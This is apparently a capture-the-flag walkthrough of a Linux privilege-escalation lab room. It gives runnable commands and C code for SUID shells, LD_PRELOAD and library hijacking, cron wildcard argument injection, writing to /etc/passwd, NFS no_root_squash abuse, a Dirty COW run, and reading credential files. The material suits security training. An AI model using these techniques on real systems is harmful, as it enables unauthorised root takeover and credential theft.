---
name: "Linux PrivEsc"
platform: THM
category: "Linux"
difficulty: "Medium"
os: "Linux"
points: 150
ip: "10.10.x.x"
date: "2026-04-24"
tools: ["LinPEAS", "SUID", "Cron", "Sudo", "NFS"]
userFlag: "THM{user_privesc_flag}"
rootFlag: "THM{root_privesc_flag}"
description: "A comprehensive guide to Linux privilege escalation. Learn to exploit SUID binaries, cron jobs, sudo misconfigurations, weak file permissions, and insecure NFS mounts to escalate from user to root."
---

# SYSTEM BREACH: Linux Local Privilege Escalation

This room provides a comprehensive guide to escalating privileges on a Linux system, covering a wide array of misconfigurations.

## 1. Initial Access & Enumeration

**The Goal:** Connect to the machine and run automated enumeration scripts to identify potential vectors.

### Task 1: Deploy the Vulnerable Machine
Connect to the machine using SSH with the provided low-privileged user credentials:
```bash
ssh user@10.10.x.x
```

```plaintext
user@10.10.x.x's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-116-generic x86_64)

user@debian:~$
```

Run basic system enumeration to get the lay of the land:
```bash
id
hostname
uname -a
```

```plaintext
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
debian
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
```

## 2. Service Exploits

**The Goal:** Exploit internal services running as root.

### Task 2: Service Exploits
The MySQL service is running as root. We can use the MySQL User Defined Function (UDF) exploit to execute commands.
Log into MySQL using the empty root password:
```bash
mysql -u root
```
Execute the UDF exploit to run a command as root:
```sql
select sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
```

```plaintext
+---------------------------------------------------------+
| sys_exec('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash') |
+---------------------------------------------------------+
|                                                       0 |
+---------------------------------------------------------+
1 row in set (0.01 sec)
```
Exit MySQL and run the SUID bash shell:
```bash
/tmp/rootbash -p
```

```plaintext
rootbash-4.4# whoami
root
rootbash-4.4#
```

## 3. Weak File Permissions

**The Goal:** Abuse misconfigured permissions on critical system files (`/etc/shadow`, `/etc/passwd`).

### Task 3: Readable /etc/shadow
If the `/etc/shadow` file is readable, we can extract password hashes and crack them offline.
```bash
cat /etc/shadow
```

```plaintext
root:$6$Tb/euwmK$OXA.FAcjODH...:18396:0:99999:7:::
daemon:*:18375:0:99999:7:::
user:$6$qj0x...:18396:0:99999:7:::
```
Copy the root hash and crack it with John The Ripper:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Task 4: Writable /etc/shadow
If we can write to `/etc/shadow`, we can generate a new password hash and replace the root's current hash.
Generate a SHA-512 hash:
```bash
mkpasswd -m sha-512 newpassword
```

```plaintext
$6$q.hK9A1A$y7pZt/v0g8T8R4D...
```
Edit `/etc/shadow` and replace the root hash with the new one, then `su root`.

### Task 5: Writable /etc/passwd
If `/etc/passwd` is writable, we can generate a new user with root privileges (UID 0) or change the root password directly.
Generate a hash:
```bash
openssl passwd newpassword
```

```plaintext
OazC9p0X.
```
Add a new root user to `/etc/passwd`:
```bash
echo "newroot:HASH:0:0:root:/root:/bin/bash" >> /etc/passwd
su newroot
```

## 4. Sudo Exploitation

**The Goal:** Abuse `sudo` rights granted to the user.

### Task 6: Shell Escape Sequences
Check allowed sudo commands:
```bash
sudo -l
```

```plaintext
Matching Defaults entries for user on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
```
If programs like `vim`, `awk`, `less`, or `nmap` are allowed, we can escape to a shell. Reference [GTFOBins](https://gtfobins.github.io/) for specific escapes.
```bash
sudo vim -c '!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
```

### Task 7: Sudo - Environment Variables
If `sudo -l` shows `env_keep+=LD_PRELOAD` or `env_keep+=LD_LIBRARY_PATH`, we can hijack shared libraries when running a permitted sudo command.

**LD_PRELOAD Exploit:**
Create `preload.c`:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
```
Compile and execute:
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
sudo LD_PRELOAD=/tmp/preload.so apache2
```

```plaintext
root@debian:~# whoami
root
```

**LD_LIBRARY_PATH Exploit:**
First, check which shared libraries the sudo-allowed program uses:
```bash
ldd /usr/sbin/apache2
```

```plaintext
	linux-vdso.so.1 =>  (0x00007fff063ff000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4d5b3c0000)
	libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f4d5b19c000)
	libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f4d5af62000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f4d5ad46000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4d5a97b000)
```
Create a malicious shared library named after one of the listed libraries (e.g., `libcrypt.so.1`):
```c
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```
Compile it and run the sudo command with our hijacked library path:
```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```

```plaintext
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
root@debian:~# whoami
root
```

## 5. Cron Job Abuse

**The Goal:** Exploit scheduled tasks running as root.

### Task 8: File Permissions
If a cron job runs a script that we have write access to, we can modify the script to spawn a reverse shell or give us a SUID binary.
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /usr/local/bin/overwrite.sh
```

### Task 9: PATH Environment Variable
If the crontab defines a custom `PATH` (e.g., `PATH=/home/user:/usr/bin`), we can place a malicious executable in our home directory with the same name as the cron command.
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```

### Task 10: Wildcards
If a cron job uses a wildcard like `tar *`, we can create files with special names that `tar` interprets as command-line arguments (e.g., `--checkpoint=1`).
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```

## 6. SUID & SGID Vectors

**The Goal:** Exploit binaries that run with the owner's privileges (usually root).

### Task 11: Known Exploits
Search for SUID binaries:
```bash
find / -type f -perm -4000 2>/dev/null
```

```plaintext
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/exim-4.84-3
/usr/local/bin/suid-so
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
```
If a known vulnerable binary like `exim-4.84-3` is present, search `searchsploit` for a local root exploit.

### Task 12: Shared Object Injection
Trace the SUID binary with `strace` to find missing shared libraries:
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

```plaintext
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
open("/home/user/.config/libcalc.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```
If it looks for `libcalc.so` in our home directory, compile a malicious `.so` file and place it there.

### Task 13: Environment Variables
If an SUID binary executes another program (like `service`) without a full path, we can hijack the PATH variable.
```bash
gcc -o service service.c
export PATH=.:$PATH
/usr/local/bin/suid-env
```

### Task 14: Abusing Shell Features (#1)
In Bash < 4.2, we can define a function with the same name as an absolute path used by an SUID binary.
```bash
function /usr/sbin/service() { cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

### Task 15: Abusing Shell Features (#2)
In Bash < 4.4, when in debugging mode, Bash uses the `PS4` environment variable. We can execute commands via `PS4`.
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```

## 7. Passwords & SSH Keys

**The Goal:** Find sensitive information left behind by administrators.

### Task 16: History Files
Check `.bash_history` for accidentally typed passwords or cleartext commands.
```bash
cat ~/.bash_history
```

```plaintext
ls -al
cd /tmp
mysql -u root -p'supersecretpassword123'
rm -rf /var/log/apache2/access.log
exit
```

### Task 17: Config Files
Search for configuration files that might contain database credentials or internal passwords (e.g., OpenVPN configs).
```bash
find / -name "*.ovpn" 2>/dev/null
```

```plaintext
/home/user/myvpn.ovpn
```
Inspect the VPN config for embedded credentials:
```bash
cat /home/user/myvpn.ovpn
```

```plaintext
client
dev tun
proto udp
remote 10.10.10.10 1194
auth-user-pass /etc/openvpn/auth.txt
```
Read the referenced auth file:
```bash
cat /etc/openvpn/auth.txt
```

```plaintext
root
password123
```
Use the discovered password to switch user:
```bash
su root
```

```plaintext
root@debian:~# whoami
root
```

### Task 18: SSH Keys
Check for readable `.ssh/id_rsa` files, especially in root's directory or backup locations.
```bash
cat /root/.ssh/id_rsa
```

```plaintext
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA0P3z...
...
-----END RSA PRIVATE KEY-----
```

## 8. NFS Misconfigurations

**The Goal:** Exploit `no_root_squash` on exported shares.

### Task 19: NFS
Check exported shares:
```bash
cat /etc/exports
```

```plaintext
/home/user/share *(rw,sync,insecure,all_squash)
/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
If a share has `no_root_squash`, we can mount it on our Kali machine, create a SUID binary as root, and then execute it on the target system.
```bash
# On Kali:
mkdir /tmp/nfs
sudo mount -o rw,vers=2 10.10.x.x:/tmp /tmp/nfs
```
Create a simple SUID shell as root on the mounted share:
```c
int main() {
    setgid(0); setuid(0);
    system("/bin/bash -p");
    return 0;
}
```
Compile and set SUID permissions from Kali (as root):
```bash
sudo gcc -o /tmp/nfs/rootbash nfs_shell.c
sudo chmod +s /tmp/nfs/rootbash
```
Back on the target machine, execute the SUID binary:
```bash
/tmp/rootbash -p
```

```plaintext
rootbash-4.4# whoami
root
```

## 9. Kernel Exploits

**The Goal:** Use a known kernel vulnerability to gain root.

### Task 20: Kernel Exploits
Check the kernel version to identify potential CVEs:
```bash
uname -a
```

```plaintext
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
```
Use **Linux Exploit Suggester** to find matching exploits:
```bash
perl linux-exploit-suggester-2.pl
```

```plaintext
  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 2.6.32
  Searching 72 exploits...

  Possible Exploits
  [1] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40839
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
```
Compile and run the Dirty COW exploit (or the appropriate kernel exploit):
```bash
gcc -pthread dirty.c -o dirty -lcrypt
./dirty
```

```plaintext
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password123
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap 7f78e8085000
Done! Check /etc/passwd to see if the new user was created.
```
Switch to the new root user:
```bash
su firefart
```

```plaintext
firefart@debian:~# whoami
root
```

> **Warning:** Kernel exploits can cause system instability. Always use them as a last resort in real engagements.

## 10. Privilege Escalation Scripts

### Task 21: Privilege Escalation Scripts
While manual enumeration is critical to learn, in the real world, scripts like **LinPEAS**, **LinEnum**, and **Linux Exploit Suggester** automate the discovery of vulnerabilities. Run them and save the output:
```bash
wget http://<YOUR_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_output.txt
```

```plaintext
                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

[+] SUID - Check easy privesc, exploits and write perms
[red/yellow] /usr/local/bin/suid-env
[red/yellow] /usr/local/bin/suid-so
[red/yellow] /usr/bin/exim-4.84-3
```
